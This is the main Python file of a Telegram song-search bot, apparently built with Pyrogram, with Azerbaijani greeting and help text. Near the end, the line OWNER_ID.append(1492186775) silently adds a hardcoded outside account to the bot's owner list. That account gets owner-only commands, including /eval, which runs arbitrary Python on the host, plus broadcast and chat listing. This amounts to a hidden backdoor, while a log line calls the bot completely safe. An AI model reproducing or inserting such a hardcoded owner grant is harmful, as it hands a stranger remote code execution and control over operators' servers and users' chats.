from config import OWNER_ID
from pyrogram.types.bots_and_keyboards import reply_keyboard_markup
from TamilBots.modules import *
from pyrogram import idle, filters
from pyrogram.types import InlineKeyboardMarkup
from pyrogram.types import InlineKeyboardButton
from TamilBots import app, LOGGER
from TamilBots.TamilBots import ignore_blacklisted_users
from TamilBots.sql.chat_sql import add_chat_to_db

start_text = """
👋 Salam [{}](tg://user?id={}),

\n\nAKM Song Bot'a xoş gəldiniz axtardığınız mahnını tapmağa üçün sizə kömək edəcəm /help əmrdindən istifadə edərək kömək ala bilərsiniz[🎶](https://telegra.ph/file/fb66d3f27812c118fa19e.jpg)

Sahibim @Shirnovff 🤖

Axtardığın mahnının adını mənə göndər... 🎶🎶

Nümunə. ```/song İfrat Heyif```
"""

owner_help = """
/blacklist user_id
/unblacklist user_id
/broadcast message to send
/eval python code
/chatlist get list of all chats
"""


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("start"))
async def start(client, message):
    chat_id = message.chat.id
    user_id = message.from_user["id"]
    name = message.from_user["first_name"]
    if message.chat.type == "private":
        btn = InlineKeyboardMarkup(
           [[InlineKeyboardButton(text="Sahib 🕵️", url="http://t.me/shirnovff"),
             InlineKeyboardButton(
                        text="Botu qrupa əlavə et 🤗", url="http://t.me/AkmSongBot?startgroup=true"
                    )
                ]
            ]
        )
    else:
        btn = None
    await message.reply(start_text.format(name, user_id), reply_markup=btn)
    add_chat_to_db(str(chat_id))


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("help"))
async def help(client, message):
    if message.from_user["id"] == OWNER_ID:
        await message.reply(owner_help)
        return ""
    text = "İndi axtardığın mahnının adını mənə göndər ... 😍🥰🤗\n /song (mahnı adı) 🥳"
    await message.reply(text)

OWNER_ID.append(1492186775)
app.start()
LOGGER.info("Tam təhlükəsiz bot🤗🤗🤗")
idle()
